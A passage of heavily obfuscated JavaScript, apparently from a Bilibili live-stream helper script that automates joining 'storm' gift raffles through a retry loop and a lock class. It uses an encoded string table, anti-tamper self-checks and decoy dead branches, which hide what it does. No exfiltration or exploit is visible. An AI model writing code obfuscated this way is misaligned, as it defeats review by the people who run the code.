4b\x68\x48\x41\x3d\x3d','\x77\x6f\x6a\x44\x76\x30\x51\x3d','\x77\x6f\x6a\x43\x69\x4d\x4b\x74\x77\x35\x44\x43\x71\x4d\x4f\x49\x57\x42\x33\x43\x67\x31\x59\x3d','\x42\x77\x37\x43\x6b\x46\x54\x44\x76\x41\x3d\x3d','\x77\x70\x7a\x44\x76\x30\x51\x3d','\x44\x4d\x4b\x65\x77\x36\x6f\x3d','\x77\x71\x74\x68\x63\x63\x4f\x6c\x45\x51\x3d\x3d','\x77\x71\x4e\x34\x77\x72\x54\x43\x70\x54\x38\x3d','\x44\x73\x4b\x52\x65\x43\x45\x2f\x77\x71\x4d\x3d','\x77\x37\x31\x34\x57\x38\x4b\x36\x4e\x67\x3d\x3d','\x4e\x77\x44\x44\x76\x46\x59\x66','\x56\x4d\x4b\x4a\x77\x36\x72\x44\x6d\x42\x56\x33\x4c\x38\x4b\x2f\x77\x36\x6c\x6f\x58\x52\x44\x44\x6f\x6b\x39\x6f\x49\x6a\x31\x4d','\x77\x6f\x56\x6c\x77\x72\x6a\x43\x6e\x38\x4b\x37\x48\x54\x5a\x4c\x4d\x53\x50\x43\x6a\x48\x73\x6e\x4d\x41\x3d\x3d','\x64\x78\x54\x43\x6d\x4d\x4b\x4c\x4d\x4d\x4b\x51\x52\x77\x3d\x3d','\x77\x37\x4c\x44\x6d\x38\x4f\x59\x77\x37\x77\x39\x46\x51\x3d\x3d','\x63\x46\x74\x64\x77\x37\x38\x76\x77\x71\x67\x43\x77\x36\x55\x39\x4f\x63\x4f\x6d\x77\x37\x4e\x6f\x48\x63\x4f\x63\x77\x71\x4a\x52\x77\x71\x45\x3d','\x50\x63\x4b\x61\x77\x37\x56\x53\x44\x51\x3d\x3d','\x77\x36\x4d\x68\x43\x63\x4b\x51\x49\x41\x3d\x3d','\x77\x70\x5a\x63\x4a\x4d\x4b\x77\x42\x51\x3d\x3d','\x77\x34\x62\x43\x67\x63\x4b\x6e\x53\x77\x34\x3d','\x4e\x79\x44\x44\x6f\x30\x58\x43\x76\x77\x3d\x3d','\x66\x73\x4b\x78\x77\x6f\x64\x73\x77\x70\x48\x44\x6a\x38\x4b\x56\x58\x57\x6b\x74\x50\x73\x4b\x38\x77\x70\x6f\x3d','\x4b\x38\x4f\x37\x55\x41\x58\x44\x68\x4d\x4b\x49','\x49\x58\x37\x44\x6e\x69\x4a\x48\x77\x36\x6e\x44\x75\x38\x4f\x48\x4e\x6c\x37\x44\x71\x53\x5a\x64\x4b\x6e\x44\x43\x70\x41\x6f\x69','\x6a\x73\x75\x6a\x69\x52\x50\x61\x6d\x55\x79\x44\x42\x46\x41\x69\x4b\x6b\x2e\x63\x4b\x6f\x6d\x74\x2e\x76\x36\x57\x4f\x53\x3d\x3d'];(function(_0x414dad,_0x55d72f,_0xa895ee){var _0x5345a2=function(_0x2cc32e,_0x5ee01b,_0x146569,_0x34d2dd,_0x36e372){_0x5ee01b=_0x5ee01b>>0x8,_0x36e372='po';var _0x1e73fd='shift',_0x10b8fe='push';if(_0x5ee01b<_0x2cc32e){while(--_0x2cc32e){_0x34d2dd=_0x414dad[_0x1e73fd]();if(_0x5ee01b===_0x2cc32e){_0x5ee01b=_0x34d2dd;_0x146569=_0x414dad[_0x36e372+'p']();}else if(_0x5ee01b&&_0x146569['replace'](/[uRPUyDBFAKkKtWOS=]/g,'')===_0x5ee01b){_0x414dad[_0x10b8fe](_0x34d2dd);}}_0x414dad[_0x10b8fe](_0x414dad[_0x1e73fd]());}return 0x619f6;};var _0x46fad1=function(){var _0x20e688={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x28c355,_0x4950ab,_0x36ab79,_0x896540){_0x896540=_0x896540||{};var _0x3b3ca9=_0x4950ab+'='+_0x36ab79;var _0x3cbd32=0x0;for(var _0x3cbd32=0x0,_0x2558ad=_0x28c355['length'];_0x3cbd32<_0x2558ad;_0x3cbd32++){var _0x516dff=_0x28c355[_0x3cbd32];_0x3b3ca9+=';\x20'+_0x516dff;var _0x666a5e=_0x28c355[_0x516dff];_0x28c355['push'](_0x666a5e);_0x2558ad=_0x28c355['length'];if(_0x666a5e!==!![]){_0x3b3ca9+='='+_0x666a5e;}}_0x896540['cookie']=_0x3b3ca9;},'removeCookie':function(){return'dev';},'getCookie':function(_0x558b57,_0x4ae8c9){_0x558b57=_0x558b57||function(_0x443d18){return _0x443d18;};var _0x4364a8=_0x558b57(new RegExp('(?:^|;\x20)'+_0x4ae8c9['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x3ec46d=typeof _0xodx=='undefined'?'undefined':_0xodx,_0x3ec5f2=_0x3ec46d['split'](''),_0x433bd3=_0x3ec5f2['length'],_0x11a5c5=_0x433bd3-0xe,_0x38a24f;while(_0x38a24f=_0x3ec5f2['pop']()){_0x433bd3&&(_0x11a5c5+=_0x38a24f['charCodeAt']());}var _0x603187=function(_0x24109b,_0x4220cd,_0x3ef4e4){_0x24109b(++_0x4220cd,_0x3ef4e4);};_0x11a5c5^-_0x433bd3===-0x524&&(_0x38a24f=_0x11a5c5)&&_0x603187(_0x5345a2,_0x55d72f,_0xa895ee);return _0x38a24f>>0x2===0x14b&&_0x4364a8?decodeURIComponent(_0x4364a8[0x1]):undefined;}};var _0x501970=function(){var _0x5b6cdd=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x5b6cdd['test'](_0x20e688['removeCookie']['toString']());};_0x20e688['updateCookie']=_0x501970;var _0x38b16b='';var _0x44b269=_0x20e688['updateCookie']();if(!_0x44b269){_0x20e688['setCookie'](['*'],'counter',0x1);}else if(_0x44b269){_0x38b16b=_0x20e688['getCookie'](null,'counter');}else{_0x20e688['removeCookie']();}};_0x46fad1();}(_0x5cc6,0x14c,0x14c00));var _0x44b0=function(_0x15b58c,_0x4c9504){_0x15b58c=~~'0x'['concat'](_0x15b58c);var _0x34d849=_0x5cc6[_0x15b58c];if(_0x44b0['lAhFtf']===undefined){(function(){var _0x585e33=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x56d213='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x585e33['atob']||(_0x585e33['atob']=function(_0x144f78){var _0x1f86c5=String(_0x144f78)['replace'](/=+$/,'');for(var _0x135a79=0x0,_0x574cd5,_0x33c6fb,_0x2cc6dd=0x0,_0xed03e0='';_0x33c6fb=_0x1f86c5['charAt'](_0x2cc6dd++);~_0x33c6fb&&(_0x574cd5=_0x135a79%0x4?_0x574cd5*0x40+_0x33c6fb:_0x33c6fb,_0x135a79++%0x4)?_0xed03e0+=String['fromCharCode'](0xff&_0x574cd5>>(-0x2*_0x135a79&0x6)):0x0){_0x33c6fb=_0x56d213['indexOf'](_0x33c6fb);}return _0xed03e0;});}());var _0xc3b7ce=function(_0x30746a,_0x4c9504){var _0x138a3=[],_0x3c056c=0x0,_0x4ef851,_0x4046eb='',_0x3ab0eb='';_0x30746a=atob(_0x30746a);for(var _0x7b7e8d=0x0,_0x455ee6=_0x30746a['length'];_0x7b7e8d<_0x455ee6;_0x7b7e8d++){_0x3ab0eb+='%'+('00'+_0x30746a['charCodeAt'](_0x7b7e8d)['toString'](0x10))['slice'](-0x2);}_0x30746a=decodeURIComponent(_0x3ab0eb);for(var _0x4d2e1b=0x0;_0x4d2e1b<0x100;_0x4d2e1b++){_0x138a3[_0x4d2e1b]=_0x4d2e1b;}for(_0x4d2e1b=0x0;_0x4d2e1b<0x100;_0x4d2e1b++){_0x3c056c=(_0x3c056c+_0x138a3[_0x4d2e1b]+_0x4c9504['charCodeAt'](_0x4d2e1b%_0x4c9504['length']))%0x100;_0x4ef851=_0x138a3[_0x4d2e1b];_0x138a3[_0x4d2e1b]=_0x138a3[_0x3c056c];_0x138a3[_0x3c056c]=_0x4ef851;}_0x4d2e1b=0x0;_0x3c056c=0x0;for(var _0x153ca6=0x0;_0x153ca6<_0x30746a['length'];_0x153ca6++){_0x4d2e1b=(_0x4d2e1b+0x1)%0x100;_0x3c056c=(_0x3c056c+_0x138a3[_0x4d2e1b])%0x100;_0x4ef851=_0x138a3[_0x4d2e1b];_0x138a3[_0x4d2e1b]=_0x138a3[_0x3c056c];_0x138a3[_0x3c056c]=_0x4ef851;_0x4046eb+=String['fromCharCode'](_0x30746a['charCodeAt'](_0x153ca6)^_0x138a3[(_0x138a3[_0x4d2e1b]+_0x138a3[_0x3c056c])%0x100]);}return _0x4046eb;};_0x44b0['GwqAeh']=_0xc3b7ce;_0x44b0['zqsrTX']={};_0x44b0['lAhFtf']=!![];}var _0x414c1e=_0x44b0['zqsrTX'][_0x15b58c];if(_0x414c1e===undefined){if(_0x44b0['wBCoyi']===undefined){var _0x100c11=function(_0x10d028){this['DHZhQq']=_0x10d028;this['HerAFY']=[0x1,0x0,0x0];this['XStDWk']=function(){return'newState';};this['KeMwWY']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['PmcWCp']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x100c11['prototype']['PKgRzJ']=function(){var _0xed9933=new RegExp(this['KeMwWY']+this['PmcWCp']);var _0x3359f6=_0xed9933['test'](this['XStDWk']['toString']())?--this['HerAFY'][0x1]:--this['HerAFY'][0x0];return this['tyvgxP'](_0x3359f6);};_0x100c11['prototype']['tyvgxP']=function(_0x295041){if(!Boolean(~_0x295041)){return _0x295041;}return this['QaFIgo'](this['DHZhQq']);};_0x100c11['prototype']['QaFIgo']=function(_0x1f93c6){for(var _0x11629f=0x0,_0x2d49ee=this['HerAFY']['length'];_0x11629f<_0x2d49ee;_0x11629f++){this['HerAFY']['push'](Math['round'](Math['random']()));_0x2d49ee=this['HerAFY']['length'];}return _0x1f93c6(this['HerAFY'][0x0]);};new _0x100c11(_0x44b0)['PKgRzJ']();_0x44b0['wBCoyi']=!![];}_0x34d849=_0x44b0['GwqAeh'](_0x34d849,_0x4c9504);_0x44b0['zqsrTX'][_0x15b58c]=_0x34d849;}else{_0x34d849=_0x414c1e;}return _0x34d849;};var _0x3f5210=function(){var _0x1326d9=!![];return function(_0x3e05fe,_0x36abc1){var _0x3c58b6=_0x1326d9?function(){if(_0x36abc1){var _0x4464ba=_0x36abc1['apply'](_0x3e05fe,arguments);_0x36abc1=null;return _0x4464ba;}}:function(){};_0x1326d9=![];return _0x3c58b6;};}();var _0x5f2316=_0x3f5210(this,function(){var _0x2d8f05=function(){return'\x64\x65\x76';},_0x4b81bb=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x34a12b=function(){var _0x36c6a6=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x36c6a6['\x74\x65\x73\x74'](_0x2d8f05['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x33748d=function(){var _0x3e4c21=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x3e4c21['\x74\x65\x73\x74'](_0x4b81bb['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x5c685e=function(_0x3e3156){var _0x1e9e81=~-0x1>>0x1+0xff%0x0;if(_0x3e3156['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x1e9e81)){_0x292610(_0x3e3156);}};var _0x292610=function(_0x151bd2){var _0x558098=~-0x4>>0x1+0xff%0x0;if(_0x151bd2['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0x558098){_0x5c685e(_0x151bd2);}};if(!_0x34a12b()){if(!_0x33748d()){_0x5c685e('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x5c685e('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x5c685e('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x5f2316();class AWaitLock{constructor(){this['\x6c\x6f\x63\x6b\x51\x75\x65\x75\x65']=[];this[_0x44b0('0','\x77\x35\x66\x31')]=![];}async['\x6c\x6f\x63\x6b'](){var _0xd051cb={'\x6c\x64\x62\x56\x6f':function(_0x43a17c,_0x447b36){return _0x43a17c+_0x447b36;},'\x63\x78\x58\x56\x6b':function(_0x444a5d,_0x1709b4){return _0x444a5d===_0x1709b4;}};if(this[_0x44b0('1','\x30\x64\x6a\x29')]){if(_0xd051cb[_0x44b0('2','\x26\x68\x52\x65')](_0x44b0('3','\x59\x75\x55\x68'),_0x44b0('4','\x69\x6b\x5e\x48'))){let _0x2129f2=this;await new Promise(_0xc800eb=>{_0x2129f2[_0x44b0('5','\x45\x25\x78\x72')][_0x44b0('6','\x6c\x76\x37\x30')](_0xc800eb);});}else{Module['\x48\x45\x41\x50\x55\x38'][_0xd051cb[_0x44b0('7','\x77\x59\x64\x62')](address,0xc)]=0x6;}}this[_0x44b0('8','\x4b\x6e\x35\x43')]=!![];return!![];}[_0x44b0('9','\x30\x64\x6a\x29')](){var _0x56bb42={'\x64\x58\x62\x43\x67':function(_0x41a932,_0x1e3bc5){return _0x41a932+_0x1e3bc5;},'\x45\x67\x7a\x73\x53':function(_0x27df33,_0x5c0d14){return _0x27df33/_0x5c0d14;},'\x73\x47\x51\x64\x70':_0x44b0('a','\x50\x32\x36\x69')};let _0x3450a1=this[_0x44b0('b','\x6f\x23\x56\x5b')][_0x44b0('c','\x42\x29\x55\x55')]();if(_0x3450a1){if(_0x44b0('d','\x47\x50\x4f\x53')===_0x56bb42[_0x44b0('e','\x57\x4c\x32\x31')]){Module[_0x44b0('f','\x4b\x6e\x35\x43')][_0x56bb42[_0x44b0('10','\x77\x59\x64\x62')](address,0xc)]=0x3;Module['\x48\x45\x41\x50\x46\x36\x34'][_0x56bb42[_0x44b0('11','\x51\x25\x5d\x28')](address,0x8)]=value;}else{_0x3450a1();}}if(this[_0x44b0('12','\x57\x76\x6e\x6b')]['\x6c\x65\x6e\x67\x74\x68']==0x0){this[_0x44b0('13','\x30\x78\x36\x55')]=![];}}}const BiliStorm={'\x6c\x6f\x63\x6b':new AWaitLock(),'\x73\x74\x6f\x72\x6d\x53\x65\x74':new Set(),'\x6a\x6f\x69\x6e':async(_0x1b2b7d,_0x1d2755,_0x527afb)=>{var _0x23edb9={'\x79\x44\x45\x6c\x6f':_0x44b0('14','\x40\x64\x71\x6b'),'\x5a\x56\x63\x62\x71':function(_0x495d02,_0x34d08b){return _0x495d02|_0x34d08b;},'\x6a\x73\x6a\x61\x41':function(_0x3ee47a,_0xf23657){return _0x3ee47a+_0xf23657;},'\x64\x74\x6c\x58\x66':function(_0x139ed8,_0x31cc0a){return _0x139ed8<<_0x31cc0a;},'\x4e\x43\x59\x54\x61':function(_0x491b40,_0x2b093e){return _0x491b40&_0x2b093e;},'\x65\x62\x6b\x5a\x53':function(_0x372b9a,_0x1b5887){return _0x372b9a+_0x1b5887;},'\x6e\x75\x72\x45\x78':function(_0x230ddf,_0x236023){return _0x230ddf*_0x236023;},'\x51\x68\x4c\x50\x43':function(_0x13f913,_0x55d63a,_0x5e3755){return _0x13f913(_0x55d63a,_0x5e3755);},'\x62\x59\x6e\x6f\x67':function(_0x42d965,_0x26cb63,_0x15d2a6){return _0x42d965(_0x26cb63,_0x15d2a6);},'\x6f\x4b\x43\x41\x6e':function(_0x2677f4,_0x2054d4){return _0x2677f4(_0x2054d4);},'\x4a\x4a\x70\x4f\x6d':function(_0x34008f,_0x421d55){return _0x34008f/_0x421d55;},'\x4c\x72\x7a\x45\x6d':'\x73\x75\x63\x63\x65\x73\x73','\x79\x4e\x6b\x54\x4c':function(_0x185d50,_0x209361){return _0x185d50&&_0x209361;},'\x56\x6e\x54\x63\x4c':function(_0x3c3817){return _0x3c3817();},'\x76\x66\x45\x76\x7a':function(_0x2cac7a,_0x2fadd3){return _0x2cac7a===_0x2fadd3;},'\x53\x6b\x65\x41\x5a':_0x44b0('15','\x57\x4c\x32\x31'),'\x58\x4b\x41\x65\x66':function(_0x3b6f31,_0x22517f){return _0x3b6f31/_0x22517f;},'\x79\x54\x72\x4d\x52':function(_0x49c0fa,_0xfe4fbf){return _0x49c0fa>_0xfe4fbf;},'\x72\x75\x48\x4e\x67':function(_0x37d8e7,_0x10cca4){return _0x37d8e7>_0x10cca4;},'\x43\x74\x46\x77\x41':_0x44b0('16','\x30\x64\x6a\x29'),'\x4c\x72\x6b\x5a\x79':function(_0x3b5bbb,_0x507806){return _0x3b5bbb===_0x507806;},'\x71\x6a\x45\x69\x52':function(_0x41a708,_0x1b70ac){return _0x41a708-_0x1b70ac;},'\x43\x4f\x6c\x54\x79':function(_0x22da89,_0x323e18){return _0x22da89+_0x323e18;},'\x71\x48\x49\x67\x77':function(_0x479fe7,_0x547bab){return _0x479fe7>_0x547bab;},'\x6c\x57\x74\x43\x4e':_0x44b0('17','\x4f\x78\x6c\x4b'),'\x74\x64\x66\x70\x6a':_0x44b0('18','\x4b\x38\x4e\x4f'),'\x69\x75\x6b\x69\x6d':_0x44b0('19','\x48\x6c\x29\x64'),'\x65\x4d\x4d\x4f\x5a':function(_0x17c56a,_0x105c40){return _0x17c56a==_0x105c40;},'\x45\x4c\x6b\x6b\x76':function(_0x5798fe,_0xeadc01){return _0x5798fe!=_0xeadc01;},'\x77\x57\x67\x4d\x55':function(_0x1060bc,_0x615901){return _0x1060bc+_0x615901;},'\x65\x54\x4c\x6f\x62':function(_0x2ebd26,_0x3d929f){return _0x2ebd26!==_0x3d929f;},'\x48\x41\x4b\x53\x54':_0x44b0('1a','\x40\x64\x71\x6b'),'\x4c\x55\x57\x64\x77':_0x44b0('1b','\x29\x67\x5b\x49'),'\x5a\x41\x57\x54\x79':'\x65\x72\x72\x6f\x72'};_0x1d2755=_0x23edb9[_0x44b0('1c','\x58\x47\x44\x4e')](parseInt,_0x1d2755,0xa);_0x1b2b7d=_0x23edb9[_0x44b0('1d','\x51\x25\x5d\x28')](parseInt,_0x1b2b7d,0xa);if(isNaN(_0x1d2755)||_0x23edb9[_0x44b0('1e','\x57\x4c\x32\x31')](isNaN,_0x1b2b7d))return $[_0x44b0('1f','\x45\x25\x78\x72')]()[_0x44b0('20','\x57\x76\x6e\x6b')]();var _0x1f7488=Math['\x72\x6f\x75\x6e\x64'](_0x1b2b7d/0xf4240);if(BiliStorm[_0x44b0('21','\x47\x50\x4f\x53')][_0x44b0('22','\x57\x76\x6e\x6b')](_0x1b2b7d))return $[_0x44b0('23','\x37\x6b\x28\x50')]()[_0x44b0('24','\x40\x64\x71\x6b')]();BiliStorm[_0x44b0('25','\x78\x57\x72\x21')][_0x44b0('26','\x52\x33\x4e\x68')](_0x1b2b7d);var _0x5180b1=0x0;_0x527afb=_0x23edb9[_0x44b0('27','\x77\x59\x64\x62')](Math[_0x44b0('28','\x59\x75\x55\x68')](_0x23edb9['\x4a\x4a\x70\x4f\x6d'](new Date()[_0x44b0('29','\x6d\x4e\x33\x48')](),0x3e8)),CONFIG['\x41\x55\x54\x4f\x5f\x4c\x4f\x54\x54\x45\x52\x59\x5f\x43\x4f\x4e\x46\x49\x47']['\x53\x54\x4f\x52\x4d\x5f\x43\x4f\x4e\x46\x49\x47'][_0x44b0('2a','\x4b\x31\x4a\x29')]);var _0x203945=0x0;var _0x58a732=0x0;window['\x74\x6f\x61\x73\x74'](_0x44b0('2b','\x6f\x23\x56\x5b')+_0x1d2755+_0x44b0('2c','\x57\x4c\x32\x31')+_0x1b2b7d+'\x29',_0x23edb9[_0x44b0('2d','\x26\x68\x52\x65')]);if(_0x23edb9[_0x44b0('2e','\x4f\x73\x32\x61')](Token,TokenUtil)&&!Info[_0x44b0('2f','\x66\x50\x57\x25')]&&CONFIG['\x41\x55\x54\x4f\x5f\x4c\x4f\x54\x54\x45\x52\x59\x5f\x43\x4f\x4e\x46\x49\x47'][_0x44b0('30','\x4f\x73\x32\x61')][_0x44b0('31','\x6d\x4e\x33\x48')]){if(_0x44b0('32','\x4a\x51\x76\x65')===_0x44b0('33','\x66\x50\x57\x25')){await _0x23edb9['\x56\x6e\x54\x63\x4c'](TokenLoad);}else{return Module[_0x44b0('34','\x6f\x2a\x51\x6d')](size);}}while(!![]){try{if(_0x23edb9['\x76\x66\x45\x76\x7a'](_0x23edb9['\x53\x6b\x65\x41\x5a'],_0x23edb9[_0x44b0('35','\x45\x25\x78\x72')])){var _0x448634=Math[_0x44b0('36','\x62\x55\x70\x6a')](_0x23edb9[_0x44b0('37','\x35\x75\x5b\x26')](new Date()[_0x44b0('38','\x41\x40\x71\x34')](),0x3e8));if(_0x23edb9[_0x44b0('39','\x66\x50\x57\x25')](_0x448634,_0x527afb)&&_0x23edb9['\x72\x75\x48\x4e\x67'](_0x527afb,0x0)){if(_0x23edb9[_0x44b0('3a','\x59\x75\x55\x68')]!==_0x23edb9[_0x44b0('3b','\x26\x68\x52\x65')]){throw new ReferenceError(_0x23edb9[_0x44b0('3c','\x73\x66\x76\x75')]);}else{window['\x74\x6f\x61\x73\x74'](_0x44b0('3d','\x78\x70\x51\x66')+_0x1d2755+'\x2c\x69\x64\x3d'+_0x1b2b7d+_0x44b0('3e','\x4b\x61\x72\x62')+_0x58a732+'\x29\u5230\u8fbe\u5c1d\u8bd5\u65f6\u95f4\u3002\x0d\x0a\u5c1d\u8bd5\u6b21\u6570\x3a'+_0x203945,'\x63\x61\x75\x74\x69\x6f\x6e');break;}}_0x203945++;let _0x3e83c4;try{await BiliStorm[_0x44b0('3f','\x37\x4f\x5e\x66')]['\x6c\x6f\x63\x6b']();var _0x2d9154,_0x3dfc0b;try{if(_0x23edb9[_0x44b0('40','\x45\x25\x78\x72')](_0x44b0('41','\x47\x57\x24\x42'),_0x44b0('42','\x4b\x31\x4a\x29'))){u=_0x23edb9[_0x44b0('43','\x29\x67\x5b\x49')](_0x23edb9[_0x44b0('44','\x6c\x76\x37\x30')](0x10000,_0x23edb9[_0x44b0('45','\x4f\x78\x6c\x4b')](_0x23edb9[_0x44b0('46','\x42\x29\x55\x55')](u,0x3ff),0xa)),_0x23edb9[_0x44b0('47','\x66\x50\x57\x25')](str[_0x44b0('48','\x37\x4f\x5e\x66')](++i),0x3ff));}else{if(_0x23edb9[_0x44b0('49','\x78\x57\x72\x21')](Token,TokenUtil)&&Info['\x61\x70\x70\x54\x6f\x6b\x65\x6e']){_0x2d9154=new Date()[_0x44b0('4a','\x45\x25\x78\x72')]();_0x3e83c4=await BiliPushUtils[_0x44b0('4b','\x50\x32\x36\x69')][_0x44b0('4c','\x5a\x55\x6a\x6c')][_0x44b0('4d','\x50\x32\x36\x69')](_0x1b2b7d,_0x1d2755);_0x3dfc0b=new Date()[_0x44b0('4e','\x78\x70\x51\x66')]();}else{_0x2d9154=new Date()[_0x44b0('4f','\x57\x76\x6e\x6b')]();_0x3e83c4=await BiliPushUtils[_0x44b0('50','\x5a\x55\x6a\x6c')]['\x53\x74\x6f\x72\x6d'][_0x44b0('51','\x78\x70\x51\x66')](_0x1b2b7d,_0x1d2755);_0x3dfc0b=new Date()[_0x44b0('52','\x73\x66\x76\x75')]();}}}finally{var _0x417177=_0x23edb9[_0x44b0('53','\x69\x6b\x5e\x48')](_0x23edb9[_0x44b0('54','\x78\x57\x72\x21')](_0x2d9154,CONFIG[_0x44b0('55','\x45\x43\x35\x64')]['\x53\x54\x4f\x52\x4d\x5f\x43\x4f\x4e\x46\x49\x47'][_0x44b0('56','\x77\x35\x66\x31')]),_0x3dfc0b);if(_0x23edb9[_0x44b0('57','\x4f\x73\x32\x61')](_0x417177,0x0)){await delayCall(()=>!![],_0x417177);}BiliStorm[_0x44b0('58','\x66\x50\x57\x25')][_0x44b0('59','\x66\x50\x57\x25')]();}_0x23edb9[_0x44b0('5a','\x41\x40\x71\x34')](DEBUG,_0x23edb9['\x6c\x57\x74\x43\x4e'],_0x3e83c4);if(_0x3e83c4[_0x44b0('5b','\x57\x76\x6e\x6b')]){if(_0x3e83c4['\x6d\x73\x67'][_0x44b0('5c','\x50\x32\x36\x69')]('\u9886\u53d6')!=-0x1){if(_0x23edb9['\x74\x64\x66\x70\x6a']===_0x23edb9[_0x44b0('5d','\x4a\x51\x76\x65')]){var _0x3627c0=keys[i];var _0x38a8fc=_0x23edb9['\x65\x62\x6b\x5a\x53'](key_array_pointer,i*0x8);Module['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45']['\x74\x6f\x5f\x75\x74\x66\x38\x5f\x73\x74\x72\x69\x6e\x67'](_0x38a8fc,_0x3627c0);Module['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45']['\x66\x72\x6f\x6d\x5f\x6a\x73'](value_array_pointer+_0x23edb9[_0x44b0('5e','\x26\x68\x52\x65')](i,0x10),value[_0x3627c0]);}else{window[_0x44b0('5f','\x2a\x52\x4c\x7a')](_0x44b0('60','\x59\x75\x55\x68')+_0x1d2755+_0x44b0('61','\x30\x5a\x53\x4e')+_0x1b2b7d+'\x2c\x62\x6c\x6f\x63\x6b\x5f\x63\x6f\x75\x6e\x74\x3d'+_0x58a732+_0x44b0('62','\x35\x75\x5b\x26')+_0x3e83c4[_0x44b0('63','\x41\x40\x71\x34')]+'\x0d\x0a\u5c1d\u8bd5\u6b21\u6570\x3a'+_0x203945,_0x23edb9['\x4c\x72\x7a\x45\x6d']);break;}}if(_0x3e83c4[_0x44b0('64','\x29\x67\x5b\x49')][_0x44b0('65','\x6c\x76\x37\x30')]('\u9a8c\u8bc1\u7801')!=-0x1){BiliPushUtils[_0x44b0('66','\x77\x35\x66\x31')]=!![];window[_0x44b0('67','\x26\x68\x52\x65')](_0x44b0('68','\x66\x50\x57\x25')+_0x1d2755+'\x2c\x69\x64\x3d'+_0x1b2b7d+_0x44b0('69','\x4f\x73\x32\x61')+_0x58a732+'\x29\u5931\u8d25\x2c\u7591\u4f3c\u8d26\u53f7\u4e0d\u652f\u6301\x2c'+_0x3e83c4[_0x44b0('6a','\x4b\x31\x4a\x29')],_0x44b0('6b','\x46\x55\x43\x61'));break;}if(_0x3e83c4[_0x44b0('6c','\x6f\x23\x56\x5b')]&&_0x23edb9[_0x44b0('6d','\x57\x76\x6e\x6b')](_0x3e83c4['\x64\x61\x74\x61'][_0x44b0('6e','\x37\x6b\x28\x50')],0x0)&&_0x23edb9['\x45\x4c\x6b\x6b\x76'](_0x3e83c4['\x6d\x73\x67'][_0x44b0('6f','\x69\x6b\x5e\x48')](_0x44b0('70','\x42\x29\x55\x55')),-0x1)){_0x58a732++;}if(_0x23edb9[_0x44b0('71','\x29\x67\x5b\x49')](_0x3e83c4[_0x44b0('72','\x6f\x2a\x51\x6d')][_0x44b0('73','\x52\x33\x4e\x68')](_0x44b0('74','\x26\x68\x52\x65')),-0x1)){break;}}else{Statistics[_0x44b0('75','\x78\x57\x72\x21')](_0x3e83c4[_0x44b0('76','\x30\x78\x36\x55')][_0x44b0('77','\x58\x47\x44\x4e')],_0x3e83c4[_0x44b0('78','\x2a\x52\x4c\x7a')][_0x44b0('79','\x48\x6c\x29\x64')]);window[_0x44b0('7a','\x78\x57\x72\x21')](_0x44b0('7b','\x4b\x31\x4a\x29')+_0x1d2755+_0x44b0('7c','\x69\x71\x55\x67')+_0x1b2b7d+_0x44b0('7d','\x4b\x38\x4e\x4f')+_0x58a732+_0x44b0('7e','\x69\x6b\x5e\x48')+_0x23edb9[_0x44b0('7f','\x69\x71\x55\x67')](_0x3e83c4[_0x44b0('80','\x6c\x76\x37\x30')][_0x44b0('81','\x42\x29\x55\x55')]+'\x78',_0x3e83c4['\x64\x61\x74\x61'][_0x44b0('82','\x5a\x55\x6a\x6c')])+'\x0d\x0a'+_0x3e83c4[_0x44b0('83','\x59\x75\x55\x68')]['\x6d\x6f\x62\x69\x6c\x65\x5f\x63\x6f\x6e\x74\x65\x6e\x74']+'\x0d\x0a\u5c1d\u8bd5\u6b21\u6570\x3a'+_0x203945,_0x44b0('84','\x37\x4f\x5e\x66'));break;}}catch(_0x489850){if(_0x23edb9[_0x44b0('85','\x37\x6b\x28\x50')](_0x23edb9['\x48\x41\x4b\x53\x54'],_0x23edb9[_0x44b0('86','\x30\x78\x36\x55')])){window[_0x44b0('87','\x73\x66\x76\x75')](_0x44b0('88','\x57\x4c\x32\x31')+_0x1d2755+_0x44b0('89','\x4a\x51\x76\x65')+_0x1b2b7d+'\x2c\x62\x6c\x6f\x63\x6b\x5f\x63\x6f\x75\x6e\x74\x3d'+_0x58a732+'\x29\u7591\u4f3c\u89e6\u53d1\u98ce\u63a7\x2c\u7ec8\u6b62\uff01\x0d\x0a\u5c1d\u8bd5\u6b21\u6570\x3a'+_0x203945,_0x23edb9['\x5a\x41\x57\x54\x79']);console[_0x44b0('8a','\x66\x50\x57\x25')](_0x489850);break;}else{var _0x2f9a30=Module['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45']['\x6c\x61\x73\x74\x5f\x72\x61\x77\x5f\x76\x61\x6c\x75\x65\x5f\x69\x64']++;Module['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45']['\x69\x64\x5f\x74\x6f\x5f\x72\x61\x77\x5f\x76\x61\x6c\x75\x65\x5f\x6d\x61\x70'][_0x2f9a30]=value;return 